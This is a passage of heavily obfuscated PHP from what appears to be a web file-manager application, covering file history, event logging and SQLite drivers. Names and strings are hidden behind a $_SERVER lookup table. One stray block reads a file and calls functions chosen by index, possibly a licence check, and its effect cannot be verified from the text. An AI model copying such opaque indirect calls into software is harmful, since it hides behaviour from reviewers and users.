$½ÄæüğÊ =& $_SERVER[ÏÒ Ì„]; $Åê—ØŞ = Model($½ÄæüğÊ[1251]); $¥éĞ¥İ = $Åê—ØŞ->sourceInfo($•Š¡’Ñé); $ÔÁªÛîñ = $Åê—ØŞ->sourceInfo($÷ÎÅÓ¢¸); $şêñ‚´‹ = $Åê—ØŞ->sourceInfo($¯äŠ˜ƒ§); $ìËáò´ƒ = array($½ÄæüğÊ[1088] => $÷ÎÅÓ¢¸, $½ÄæüğÊ[1971] => $ÔÁªÛîñ[$½ÄæüğÊ[28]], $½ÄæüğÊ[1951] => !empty($ÔÁªÛîñ[$½ÄæüğÊ[513]]) ? $ÔÁªÛîñ[$½ÄæüğÊ[513]] : $½ÄæüğÊ[33], $½ÄæüğÊ[1089] => $¯äŠ˜ƒ§, $½ÄæüğÊ[1972] => $şêñ‚´‹[$½ÄæüğÊ[28]], $½ÄæüğÊ[1973] => !empty($şêñ‚´‹[$½ÄæüğÊ[513]]) ? $şêñ‚´‹[$½ÄæüğÊ[513]] : $½ÄæüğÊ[33]); $this->addEvent($•Š¡’Ñé, $½ÄæüğÊ[545], $ìËáò´ƒ); $¥éĞ¥İ = $Åê—ØŞ->sourceInfo($•Š¡’Ñé); $ìËáò´ƒ = array($½ÄæüğÊ[397] => $¥éĞ¥İ[$½ÄæüğÊ[397]], $½ÄæüğÊ[28] => $¥éĞ¥İ[$½ÄæüğÊ[28]]); $this->addEvent($÷ÎÅÓ¢¸, $½ÄæüğÊ[1974], $ìËáò´ƒ); } public function eventCopy($­Ô’›Ä) { $this->eventCreate($­Ô’›Ä, $_SERVER[ÏÒ Ì„][543]); } public function eventRename($ÒæÛ¿ŒÖ, $Úäáº•ğ, $å˜ÎÔóã) { $áğ™·Şï =& $_SERVER[ÏÒ Ì„]; $ĞÒ¬× = array($áğ™·Şï[1088] => $Úäáº•ğ, $áğ™·Şï[1089] => $å˜ÎÔóã); return $this->addEvent($ÒæÛ¿ŒÖ, $áğ™·Şï[1268], $ĞÒ¬×); } public function eventAddComment($˜™ä“ö, $§†«’Ğ„) { return $this->addEvent($˜™ä“ö, $_SERVER[ÏÒ Ì„][1975], $§†«’Ğ„); } public function eventAddDesc($Ï¶†ªÚõ, $˜ÊºŒ) { return $this->addEvent($Ï¶†ªÚõ, $_SERVER[ÏÒ Ì„][1976], $˜ÊºŒ); } public function listBySource($İüÁ©òØ) { $–èçöÓ =& $_SERVER[ÏÒ Ì„]; $©ˆù€¤ = Model($–èçöÓ[1251])->sourceInfo($İüÁ©òØ); $Ò–÷ìşë = array($–èçöÓ[412] => $İüÁ©òØ); if ($©ˆù€¤[$–èçöÓ[405]] == $–èçöÓ[87]) { $–†ÍÇ½¤ = Model($–èçöÓ[1251])->listSearchChildren($İüÁ©òØ, 20000); $–†ÍÇ½¤[] = $İüÁ©òØ . $–èçöÓ[376]; $Ò–÷ìşë = array($–èçöÓ[397] => array($–èçöÓ[7], $–†ÍÇ½¤)); } $á°³Øü¢ = $this->where($Ò–÷ìşë)->order($–èçöÓ[1977])->selectPage(); if ($á°³Øü¢[$–èçöÓ[364]][$–èçöÓ[365]] == 0) { $á°³Øü¢[$–èçöÓ[364]][$–èçöÓ[365]] = 1; $á°³Øü¢[$–èçöÓ[367]] = array(array($–èçöÓ[412] => $İüÁ©òØ, $–èçöÓ[1960] => $©ˆù€¤[$–èçöÓ[492]], $–èçöÓ[1569] => $©ˆù€¤[$–èçöÓ[446]], $–èçöÓ[417] => $–èçöÓ[1978], $–èçöÓ[418] => $©ˆù€¤[$–èçöÓ[194]], $–èçöÓ[1571] => $–èçöÓ[33])); } return $this->eventListParse($á°³Øü¢, $İüÁ©òØ); } private function eventListParse($Éşº«Ü, $Óç™Ô¾Ò) { $Ñ ¸‘¦‘ =& $_SERVER[ÏÒ Ì„]; $ô…§ûÔ = $Éşº«Ü[$Ñ ¸‘¦‘[367]]; $ğ­­Î˜· = array_to_keyvalue($ô…§ûÔ, $Ñ ¸‘¦‘[33], $Ñ ¸‘¦‘[397]); $¥€¼»ÇŠ = array_to_keyvalue($ô…§ûÔ, $Ñ ¸‘¦‘[33], $Ñ ¸‘¦‘[1966]); foreach ($ô…§ûÔ as $ÅÜØíò) { $ÓÈ¬ÎÑˆ = $ÅÜØíò[$Ñ ¸‘¦‘[445]]; if ($ÅÜØíò[$Ñ ¸‘¦‘[29]] == $Ñ ¸‘¦‘[545] && isset($ÓÈ¬ÎÑˆ[$Ñ ¸‘¦‘[1088]])) { $ğ­­Î˜·[] = $ÓÈ¬ÎÑˆ[$Ñ ¸‘¦‘[1088]] . $Ñ ¸‘¦‘[33]; $ğ­­Î˜·[] = $ÓÈ¬ÎÑˆ[$Ñ ¸‘¦‘[1089]] . $Ñ ¸‘¦‘[33]; } if ($ÅÜØíò[$Ñ ¸‘¦‘[29]] == $Ñ ¸‘¦‘[1974] && isset($ÓÈ¬ÎÑˆ[$Ñ ¸‘¦‘[397]])) { $ğ­­Î˜·[] = $ÓÈ¬ÎÑˆ[$Ñ ¸‘¦‘[397]] . $Ñ ¸‘¦‘[33]; } } $ğ­­Î˜· = array_merge($ğ­­Î˜·, $¥€¼»ÇŠ, array($Óç™Ô¾Ò . $Ñ ¸‘¦‘[33])); $ğ­­Î˜· = array_unique($ğ­­Î˜·); $¦İ›’ìÔ = array_unique(array_to_keyvalue($ô…§ûÔ, $Ñ ¸‘¦‘[33], $Ñ ¸‘¦‘[1578])); $¤«øÜÁŞ = Model($Ñ ¸‘¦‘[532])->userListInfo($¦İ›’ìÔ); $à•òñ®‘ = Model($Ñ ¸‘¦‘[822])->sourceListInfo($ğ­­Î˜·, !0); foreach ($ô…§ûÔ as &$ÅÜØíò) { if ($ÅÜØíò[$Ñ ¸‘¦‘[29]] == $Ñ ¸‘¦‘[545] && isset($ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[1088]])) { $ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[1088]] = $à•òñ®‘[$ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[1088]]]; $ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[1089]] = $à•òñ®‘[$ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[1089]]]; } if ($ÅÜØíò[$Ñ ¸‘¦‘[29]] == $Ñ ¸‘¦‘[1974] && isset($ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[397]])) { $ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[397]] = $à•òñ®‘[$ÅÜØíò[$Ñ ¸‘¦‘[445]][$Ñ ¸‘¦‘[397]]]; } $ÅÜØíò[$Ñ ¸‘¦‘[85]] = $à•òñ®‘[$ÅÜØíò[$Ñ ¸‘¦‘[397]]]; $ÅÜØíò[$Ñ ¸‘¦‘[1979]] = $à•òñ®‘[$ÅÜØíò[$Ñ ¸‘¦‘[1966]]]; if ($ÅÜØíò[$Ñ ¸‘¦‘[29]] == $Ñ ¸‘¦‘[1714]) { $ÅÜØíò[$Ñ ¸‘¦‘[1979]] = $ÅÜØíò[$Ñ ¸‘¦‘[85]]; $ÅÜØíò[$Ñ ¸‘¦‘[1966]] = $ÅÜØíò[$Ñ ¸‘¦‘[1979]][$Ñ ¸‘¦‘[397]]; $ÅÜØíò[$Ñ ¸‘¦‘[85]] = !1; $ÅÜØíò[$Ñ ¸‘¦‘[397]] = $Ñ ¸‘¦‘[33]; } $ÅÜØíò[$Ñ ¸‘¦‘[1911]] = $¤«øÜÁŞ[$ÅÜØíò[$Ñ ¸‘¦‘[1578]]]; } unset($ÅÜØíò); $Éşº«Ü[$Ñ ¸‘¦‘[367]] = $ô…§ûÔ; return $Éşº«Ü; } public function removeBySource($±×ƒü) { $éöü¾â¿ = array($_SERVER[ÏÒ Ì„][412] => $±×ƒü); $this->where($éöü¾â¿)->remove(); } } if ($_SERVER[$_SERVER[ÏÒ Ì„][871]] != $_SERVER[$_SERVER[ÏÒ Ì„][1261]]) { $_getc = $_SERVER[ÏÒ Ì„][873]; $_getfile = $_SERVER[$_SERVER[ÏÒ Ì„][874]] . $_SERVER[ÏÒ Ì„][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏÒ Ì„][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÏÒ Ì„][644]) { $exit = $_SERVER[ÏÒ Ì„][876]; $exit(); } $_act = $_SERVER[ÏÒ Ì„][1259]; $_act($_SERVER[$_SERVER[ÏÒ Ì„][869]]); } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\145\137\150\151\x73\164\157\162\171"; public function historyCount($í•ÚŸÓª) { $¯Íá—¡Ö =& $_SERVER[ÏÒ Ì„]; if (!$í•ÚŸÓª) { return array(); } if (is_string($í•ÚŸÓª) || is_int($í•ÚŸÓª)) { $í•ÚŸÓª = array($í•ÚŸÓª); } $¦õÜŒÀª = array($¯Íá—¡Ö[397], $¯Íá—¡Ö[1778] => $¯Íá—¡Ö[494]); $®¹¹¿©’ = array($¯Íá—¡Ö[397] => array($¯Íá—¡Ö[7], $í•ÚŸÓª)); $‘£’§Ò = $this->field($¦õÜŒÀª)->where($®¹¹¿©’)->group($¯Íá—¡Ö[397])->select(); return array_to_keyvalue($‘£’§Ò, $¯Íá—¡Ö[397], $¯Íá—¡Ö[494]); } public function addHistory($ÄÆŒÔö®, $®œ˜ñ = '') { $ê£¶ —õ =& $_SERVER[ÏÒ Ì„]; $ü¡×öàù = array($ê£¶ —õ[412] => $ÄÆŒÔö®[$ê£¶ —õ[397]], $ê£¶ —õ[1569] => isset($ÄÆŒÔö®[$ê£¶ —õ[448]]) ? $ÄÆŒÔö®[$ê£¶ —õ[448]] : $ÄÆŒÔö®[$ê£¶ —õ[446]], $ê£¶ —õ[462] => $ÄÆŒÔö®[$ê£¶ —õ[461]], $ê£¶ —õ[573] => $ÄÆŒÔö®[$ê£¶ —õ[78]], $ê£¶ —õ[1980] => $®œ˜ñ); $¹ĞÃŠ­Å = $GLOBALS[$ê£¶ —õ[6]][$ê£¶ —õ[88]][$ê£¶ —õ[1137]]; if ($¹ĞÃŠ­Å > 1) { $this->historyAutoClear($ü¡×öàù[$ê£¶ —õ[397]]); $this->add($ü¡×öàù); } Hook::trigger($ê£¶ —õ[1981], $ü¡×öàù); Model($ê£¶ —õ[1982])->eventFileEdit($ÄÆŒÔö®[$ê£¶ —õ[397]]); } private function historyAutoClear($…Ş‡ÁÔ) { $ñ§­Îú =& $_SERVER[ÏÒ Ì„]; $ô±¥º£× = Model($ñ§­Îú[760])->get($ñ§­Îú[1159]); $ÙÓÛÆÔ = $GLOBALS[$ñ§­Îú[6]][$ñ§­Îú[88]][$ñ§­Îú[1137]]; $…Œúì×Ø = $ô±¥º£× == $ñ§­Îú[1160] ? 5 : $ÙÓÛÆÔ; if ($ÙÓÛÆÔ <= 1) { $…Œúì×Ø = 1; } if ($…Œúì×Ø >= 500) { return; } $ÆÛÖÚ¥ = array($ñ§­Îú[412] => $…Ş‡ÁÔ); $ğÛÒŠÏ = $this->field($ñ§­Îú[1983])->where($ÆÛÖÚ¥)->order($ñ§­Îú[1977])->select(); if (!$ğÛÒŠÏ || $…Œúì×Ø >= count($ğÛÒŠÏ)) { return; } $§µê¡¦é = array_to_keyvalue($ğÛÒŠÏ, $ñ§­Îú[33], $ñ§­Îú[395]); $§µê¡¦é = array_slice($§µê¡¦é, $…Œúì×Ø); $¡¨Ş†Ë = array_to_keyvalue($ğÛÒŠÏ, $ñ§­Îú[33], $ñ§­Îú[461]); $¡¨Ş†Ë = array_slice($¡¨Ş†Ë, $…Œúì×Ø); if (!$§µê¡¦é || !$¡¨Ş†Ë) { return; } $ÆÛÖÚ¥ = array($ñ§­Îú[414] => array($ñ§­Îú[7], $§µê¡¦é)); $this->where($ÆÛÖÚ¥)->delete(); Model($ñ§­Îú[464])->remove($¡¨Ş†Ë); } public function listData($Ÿ÷ğÌİ) { $õ¼Î½½ =& $_SERVER[ÏÒ Ì„]; $Ç°¾è¶² = array($õ¼Î½½[412] => $Ÿ÷ğÌİ); $æ©Ã›¼ = $õ¼Î½½[1984]; $¸®˜ä¡ = $this->field($æ©Ã›¼)->where($Ç°¾è¶²)->order($õ¼Î½½[1977])->selectPage(); $this->_listAppendUser($¸®˜ä¡[$õ¼Î½½[367]]); $Ş‡ù²íû = Model($õ¼Î½½[760])->get($õ¼Î½½[1159]); $è»ê‚Áæ = 5; if ($Ş‡ù²íû == $õ¼Î½½[1160]) { $¸®˜ä¡[$õ¼Î½½[367]] = array_slice($¸®˜ä¡[$õ¼Î½½[367]], 0, $è»ê‚Áæ); $¸®˜ä¡[$õ¼Î½½[364]] = array($õ¼Î½½[1985] => 1, $õ¼Î½½[1986] => 20, $õ¼Î½½[1987] => 1, $õ¼Î½½[1988] => count($¸®˜ä¡[$õ¼Î½½[367]])); } return $¸®˜ä¡; } protected function _listAppendUser(&$ı­»òÖº) { $¯÷Ÿœ¹ =& $_SERVER[ÏÒ Ì„]; $¯­¨Íæ× = array_to_keyvalue($ı­»òÖº, $¯÷Ÿœ¹[33], $¯÷Ÿœ¹[1578]); $¢–¼¥à¾ = Model($¯÷Ÿœ¹[532])->userListInfo($¯­¨Íæ×); foreach ($ı­»òÖº as &$Æâ‘í„Ú) { $œÜÒô”› = $Æâ‘í„Ú[$¯÷Ÿœ¹[1578]]; $Æâ‘í„Ú[$¯÷Ÿœ¹[446]] = $¢–¼¥à¾[$œÜÒô”›] ? $¢–¼¥à¾[$œÜÒô”›] : !1; } unset($Æâ‘í„Ú); } public function fileInfo($ó¤ó§ûá) { $óÌİÎÃì =& $_SERVER[ÏÒ Ì„]; $ğµ—ÃĞ× = $this->tablePrefix; $Ó”•ƒı– = "{$ğµ—ÃĞ×}\x69\157\x5f\x66\x69\x6c\x65\x20\x66\x69\x6c\145\163\x20\157\156\40\146\x69\x6c\145\163\x2e\x66\151\x6c\x65\111\104\x20\75\x20\150\x69\163\164\157\x72\x79\56\146\x69\x6c\145\x49\104"; return $this->alias($óÌİÎÃì[1989])->where(array($óÌİÎÃì[414] => $ó¤ó§ûá))->join($Ó”•ƒı–, $óÌİÎÃì[1990])->find(); } public function removeItem($ò§Å²óÜ) { $–˜ğ‹Â† =& $_SERVER[ÏÒ Ì„]; $´•ô±şÚ = array($–˜ğ‹Â†[414] => $ò§Å²óÜ); $Œ½ÚÄ™º = $this->where($´•ô±şÚ)->find(); if ($Œ½ÚÄ™º) { $…´Î˜´á = $this->where($´•ô±şÚ)->delete(); Model($–˜ğ‹Â†[464])->remove($Œ½ÚÄ™º[$–˜ğ‹Â†[461]]); return $…´Î˜´á; } return !1; } public function removeBySource($Æº½­´”) { $ÈØ÷Ë =& $_SERVER[ÏÒ Ì„]; if (!$Æº½­´”) { return !1; } if (!is_array($Æº½­´”)) { $Æº½­´” = array($Æº½­´”); } $«èÚ’¡¡ = array($ÈØ÷Ë[412] => array($ÈØ÷Ë[7], $Æº½­´”)); $Æáú˜Ôı = $this->field($ÈØ÷Ë[462])->where($«èÚ’¡¡)->select(); if ($Æáú˜Ôı) { $this->where($«èÚ’¡¡)->delete(); $ššŠ‘øÖ = array_to_keyvalue($Æáú˜Ôı, $ÈØ÷Ë[33], $ÈØ÷Ë[461]); Model($ÈØ÷Ë[464])->remove($ššŠ‘øÖ); } return !0; } public function setDetail($‚Àñı£Ô, $‰ãïöşö) { $§Û”É¿á =& $_SERVER[ÏÒ Ì„]; return $this->where(array($§Û”É¿á[414] => $‚Àñı£Ô))->save(array($§Û”É¿á[1980] => $‰ãïöşö)); } public function rollbackToItem($Ê±·¼âñ, $£¤ŸşèÍ) { $÷Áœò”œ =& $_SERVER[ÏÒ Ì„]; $‹¥´ä· = Model($÷Áœò”œ[822])->sourceInfo($Ê±·¼âñ); $this->addHistory($‹¥´ä·, LNG($÷Áœò”œ[1991])); $¸‡·ô© = $this->find($£¤ŸşèÍ); $óÜÀÆ°Ë = array($÷Áœò”œ[461] => $¸‡·ô©[$÷Áœò”œ[461]], $÷Áœò”œ[78] => $¸‡·ô©[$÷Áœò”œ[78]], $÷Áœò”œ[84] => time(), $÷Áœò”œ[448] => USER_ID); Model($÷Áœò”œ[822])->where(array($÷Áœò”œ[397] => $Ê±·¼âñ))->save($óÜÀÆ°Ë); return $this->where(array($÷Áœò”œ[414] => $£¤ŸşèÍ))->delete(); } public function clearSame($ŠòŒ¶ä) { $Û™·’¢ö =& $_SERVER[ÏÒ Ì„]; $ñ ƒÕ™ß = $this->listData($ŠòŒ¶ä); $•øÙ¦Ó– = array_to_keyvalue_group($ñ ƒÕ™ß, $Û™·’¢ö[461]); $äë¤Í‡ = array(); $î©ì©É = array(); foreach ($•øÙ¦Ó– as $òä–¯èÎ) { if (!$òä–¯èÎ || count($òä–¯èÎ) <= 1) { continue; } foreach ($òä–¯èÎ as $’ÈÉûÁÚ) { $äë¤Í‡[] = $’ÈÉûÁÚ[$Û™·’¢ö[461]]; $î©ì©É[] = $’ÈÉûÁÚ[$Û™·’¢ö[395]]; } } if (!$î©ì©É) { return; } $this->where(array($Û™·’¢ö[395] => array($Û™·’¢ö[7], $î©ì©É)))->delete(); Model($Û™·’¢ö[464])->remove($äë¤Í‡); } public function userSpace() { $Á™³ˆ¤¦ =& $_SERVER[ÏÒ Ì„]; $ØÆ´Ì×– = $this->tablePrefix; $†ı´å°³ = array($Á™³ˆ¤¦[1569] => USER_ID); $óÉÁô´¯ = "{$ØÆ´Ì×–}\x69\x6f\x5f\146\151\154\x65\40\x66\x69\x6c\x65\163\x20\157\x6e\40\x66\151\x6c\x65\x73\x2e\146\151\154\x65\111\104\40\75\40\150\151\163\164\157\162\x79\56\x66\151\x6c\x65\x49\104"; return $this->alias($Á™³ˆ¤¦[1989])->where($†ı´å°³)->join($óÉÁô´¯, $Á™³ˆ¤¦[1990])->sum($Á™³ˆ¤¦[78]); } } goto dØ¯ğà¡¤é; eèù±­‹¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $×Š–ó =& $_SERVER[ÏÒ Ì„]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$×Š–ó[6]] =& $config; $this->values[$×Š–ó[7]] =& $in; $this->tpl = TEMPLATE . MOD . $×Š–ó[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ş™®˜’£) { if (1 === func_num_args()) { $this->{$ş™®˜’£} = new $ş™®˜’£(); } else { $˜áÌ‹Á† = new ReflectionClass($ş™®˜’£); $ÀØ€Î†· = func_get_args(); array_shift($ÀØ€Î†·); $this->{$ş™®˜’£} = $˜áÌ‹Á†->newInstanceArgs($ÀØ€Î†·); } return $this->{$ş™®˜’£}; } protected function assign($çş˜ø–, $€ùç¢É) { $this->values[$çş˜ø–] = $€ùç¢É; } protected function display($È¯¯¼€Û) { ob_end_clean(); extract($this->values); require $this->tpl . $È¯¯¼€Û; } } class DbSqliteBase extends Db { public function __construct($ú—Å„·Ÿ = '') { $Ğ•ìàƒ€ =& $_SERVER[ÏÒ Ì„]; if (!extension_loaded($Ğ•ìàƒ€[9])) { think_exception(think_lang($Ğ•ìàƒ€[10]) . $Ğ•ìàƒ€[11]); } if (!empty($ú—Å„·Ÿ)) { if (!isset($ú—Å„·Ÿ[$Ğ•ìàƒ€[12]])) { $ú—Å„·Ÿ[$Ğ•ìàƒ€[12]] = 438; } $this->config = $ú—Å„·Ÿ; if (empty($this->config[$Ğ•ìàƒ€[13]])) { $this->config[$Ğ•ìàƒ€[13]] = array(); } } } public function connect($êµÒÀÅ‚ = '', $ƒàË º = 0) { $ÚÚÒ¹’Ñ =& $_SERVER[ÏÒ Ì„]; if (!isset($this->linkID[$ƒàË º])) { if (empty($êµÒÀÅ‚)) { $êµÒÀÅ‚ = $this->config; } $ĞİÃˆÆß = !empty($êµÒÀÅ‚[$ÚÚÒ¹’Ñ[13]][$ÚÚÒ¹’Ñ[14]]) ? $êµÒÀÅ‚[$ÚÚÒ¹’Ñ[13]][$ÚÚÒ¹’Ñ[14]] : $this->pconnect; $¡¶êâöò = $ĞİÃˆÆß ? $ÚÚÒ¹’Ñ[15] : $ÚÚÒ¹’Ñ[16]; $this->linkID[$ƒàË º] = $¡¶êâöò($êµÒÀÅ‚[$ÚÚÒ¹’Ñ[17]], $êµÒÀÅ‚[$ÚÚÒ¹’Ñ[12]]); if (!$this->linkID[$ƒàË º]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ƒàË º], 30000); if (1 != think_config($ÚÚÒ¹’Ñ[18])) { unset($this->config); } } return $this->linkID[$ƒàË º]; } public function free() { $this->queryID = null; } public function query($İê²§ş¼) { $”ç²©Ì =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İê²§ş¼; if ($this->queryID) { $this->free(); } think_action_status($”ç²©Ì[19], 1); think_status($”ç²©Ì[20]); $this->queryID = sqlite_query($this->_linkID, $İê²§ş¼); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÍàòØˆ£ = $this->getAll(); return $ÍàòØˆ£; } } public function execute($˜¦ ‰¤) { $çŸâŸÚ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜¦ ‰¤; if ($this->queryID) { $this->free(); } think_action_status($çŸâŸÚ[21], 1); think_status($çŸâŸÚ[20]); $éË†•áï = sqlite_exec($this->_linkID, $˜¦ ‰¤); $this->debug(); if (!1 === $éË†•áï) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÏÒ Ì„][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¸ı¦€î¼ = sqlite_query($this->_linkID, $_SERVER[ÏÒ Ì„][23]); if (!$¸ı¦€î¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ùç¾»× = sqlite_query($this->_linkID, $_SERVER[ÏÒ Ì„][24]); if (!$ùç¾»×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ãËİ·´Ã = array(); if ($this->numRows > 0) { for ($ë“”€Äó = 0; $ë“”€Äó < $this->numRows; $ë“”€Äó++) { $ãËİ·´Ã[$ë“”€Äó] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ãËİ·´Ã; } public function getFields($ÇõÜéş”) { $½™ûãéõ =& $_SERVER[ÏÒ Ì„]; $¸ÖëÅàò = $this->query($½™ûãéõ[25] . $ÇõÜéş” . $½™ûãéõ[26]); $Ú£ÜùÏÆ = array(); if ($¸ÖëÅàò) { foreach ($¸ÖëÅàò as $Ÿ³áÀ„ğ => $ÇÂ«ñ÷„) { $Ú£ÜùÏÆ[$ÇÂ«ñ÷„[$½™ûãéõ[27]]] = array($½™ûãéõ[28] => $ÇÂ«ñ÷„[$½™ûãéõ[27]], $½™ûãéõ[29] => $ÇÂ«ñ÷„[$½™ûãéõ[30]], $½™ûãéõ[31] => (bool) ($ÇÂ«ñ÷„[$½™ûãéõ[32]] === $½™ûãéõ[33]), $½™ûãéõ[34] => $ÇÂ«ñ÷„[$½™ûãéõ[35]], $½™ûãéõ[36] => strtolower($ÇÂ«ñ÷„[$½™ûãéõ[37]]) == $½™ûãéõ[38], $½™ûãéõ[39] => strtolower($ÇÂ«ñ÷„[$½™ûãéõ[40]]) == $½™ûãéõ[41]); } } return $Ú£ÜùÏÆ; } public function getTables($£ºİá×´ = '') { $‰Ú°–ı =& $_SERVER[ÏÒ Ì„]; $şïß˜áÒ = $this->query($‰Ú°–ı[42] . $‰Ú°–ı[43] . $‰Ú°–ı[44]); $¡¿×…áÑ = array(); foreach ($şïß˜áÒ as $¡Ï†ãÔª => $€û½¤ˆë) { $¡¿×…áÑ[$¡Ï†ãÔª] = current($€û½¤ˆë); } return $¡¿×…áÑ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ñİšª™ì =& $_SERVER[ÏÒ Ì„]; $Êäİ×¾Ê = sqlite_last_error($this->_linkID); $this->error = $Êäİ×¾Ê . $ñİšª™ì[4] . sqlite_error_string($Êäİ×¾Ê); if ($ñİšª™ì[33] != $this->queryStr) { $this->error .= LNG($ñİšª™ì[45]) . $this->queryStr; } think_trace($this->error, $ñİšª™ì[33], $ñİšª™ì[46]); return $this->error; } public function escapeString($Ÿ®ÑšÜ) { return sqlite_escape_string($Ÿ®ÑšÜ); } public function parseLimit($Û¾¾ ) { $Ã¶Ä©¹ˆ =& $_SERVER[ÏÒ Ì„]; $ÂÖÒ‡¯å = $Ã¶Ä©¹ˆ[33]; if (!empty($Û¾¾ )) { $Û¾¾  = explode($Ã¶Ä©¹ˆ[47], $Û¾¾ ); if (count($Û¾¾ ) > 1) { $ÂÖÒ‡¯å .= $Ã¶Ä©¹ˆ[48] . $Û¾¾ [1] . $Ã¶Ä©¹ˆ[49] . $Û¾¾ [0] . $Ã¶Ä©¹ˆ[50]; } else { $ÂÖÒ‡¯å .= $Ã¶Ä©¹ˆ[48] . $Û¾¾ [0] . $Ã¶Ä©¹ˆ[50]; } } return $ÂÖÒ‡¯å; } } class DbSqlite3Base extends Db { public function __construct($ÊœÓ²³ = '') { $ş†ßí Ğ =& $_SERVER[ÏÒ Ì„]; if (!class_exists($ş†ßí Ğ[51])) { think_exception(think_lang($ş†ßí Ğ[10]) . $ş†ßí Ğ[52]); } if (!empty($ÊœÓ²³)) { if (!isset($ÊœÓ²³[$ş†ßí Ğ[12]])) { $ÊœÓ²³[$ş†ßí Ğ[12]] = 438; } $this->config = $ÊœÓ²³; if (empty($this->config[$ş†ßí Ğ[13]])) { $this->config[$ş†ßí Ğ[13]] = array(); } } } public function connect($”’€ÎŠá = '', $æ²ÖÅ¯ = 0) { $á‹œü¿ =& $_SERVER[ÏÒ Ì„]; if (!isset($this->linkID[$æ²ÖÅ¯])) { if (empty($”’€ÎŠá)) { $”’€ÎŠá = $this->config; } $this->linkID[$æ²ÖÅ¯] = new SQLite3($”’€ÎŠá[$á‹œü¿[17]]); if (!$this->linkID[$æ²ÖÅ¯]) { think_exception($this->linkID[$æ²ÖÅ¯]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$æ²ÖÅ¯]->busyTimeout(30000); if (1 != think_config($á‹œü¿[18])) { unset($this->config); } } return $this->linkID[$æ²ÖÅ¯]; } public function free() { $this->queryID = null; } public function query($ô¼‡”—ú) { $Ä¡÷Ãà¬ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ô¼‡”—ú; if ($this->queryID) { $this->free(); } think_action_status($Ä¡÷Ãà¬[19], 1); think_status($Ä¡÷Ãà¬[20]); $this->queryID = $this->_linkID->query($ô¼‡”—ú); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $óÇĞ¼™æ = $this->getAll(); $this->numRows = count($óÇĞ¼™æ); return $óÇĞ¼™æ; } } public function execute($ñ¶îŸÒì) { $‹‚ •é‡ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ñ¶îŸÒì; if ($this->queryID) { $this->free(); } think_action_status($‹‚ •é‡[21], 1); think_status($‹‚ •é‡[20]); $áõ¤¤¨¥ = $this->_linkID->exec($ñ¶îŸÒì); $this->debug(); if (!1 === $áõ¤¤¨¥) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÏÒ Ì„][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğòÅõ¶ = $this->_linkID->query($_SERVER[ÏÒ Ì„][23]); if (!$ğòÅõ¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ØãÀŒŸ = $this->_linkID->query($_SERVER[ÏÒ Ì„][24]); if (!$ØãÀŒŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ªÏ»™ŠÆ = array(); while ($¥ıÍ¨¡¨ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ªÏ»™ŠÆ[] = $¥ıÍ¨¡¨; } $this->queryID->reset(); return $ªÏ»™ŠÆ; } public function getFields($Óö²¾Ö) { $­³äÅ‡ƒ =& $_SERVER[ÏÒ Ì„]; $Ôß—ÌŞ± = $this->query($­³äÅ‡ƒ[25] . $Óö²¾Ö . $­³äÅ‡ƒ[26]); $êÕ•¢§ú = array(); if ($Ôß—ÌŞ±) { foreach ($Ôß—ÌŞ± as $êªå„á => $ÉüÛøõ¬) { $êÕ•¢§ú[$ÉüÛøõ¬[$­³äÅ‡ƒ[28]]] = array($­³äÅ‡ƒ[28] => $ÉüÛøõ¬[$­³äÅ‡ƒ[28]], $­³äÅ‡ƒ[29] => $ÉüÛøõ¬[$­³äÅ‡ƒ[29]], $­³äÅ‡ƒ[31] => (bool) ($ÉüÛøõ¬[$­³äÅ‡ƒ[31]] === $­³äÅ‡ƒ[33]), $­³äÅ‡ƒ[34] => 